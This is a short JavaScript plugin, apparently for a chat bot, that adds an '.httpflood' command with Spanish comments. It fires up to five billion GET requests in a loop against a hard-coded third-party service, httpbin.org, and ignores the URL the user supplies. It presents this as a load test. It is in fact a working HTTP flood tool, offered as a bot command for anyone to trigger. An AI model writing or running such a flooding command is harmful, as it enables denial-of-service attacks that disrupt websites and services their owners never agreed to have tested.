import axios from 'axios'; // Asegúrate de tener axios instalado

let handler = async (m, { text, conn }) => {
  if (!text.startsWith('http')) return m.reply('❌ Debes poner una URL válida.\nEjemplo: .httpflood https://miweb.com');

  let target = 'https://httpbin.org/get'; // Página de prueba para ver las solicitudes
  let cantidad = 5000000000; // Puedes aumentar para pruebas más exigentes

  m.reply(`🚀 Iniciando test HTTP Flood a: ${target}\nPeticiones: ${cantidad}`);

  for (let i = 0; i < cantidad; i++) {
    axios.get(target).then(res => {
      console.log(`✅ Petición ${i + 1} enviada: ${res.status}`);
    }).catch(err => {
      console.log(`⚠️ Error en petición ${i + 1}:`, err.code || err.message);
    });
    await new Promise(r => setTimeout(r, 100)); // Pequeño delay para no saturar demasiado rápido
  }

  m.reply('✅ Prueba de carga finalizada. Revisa el rendimiento de tu sitio.');
};

handler.command = /^httpflood$/i;
handler.tags = ['tools'];
handler.help = ['httpflood <url>'];
export default handler;
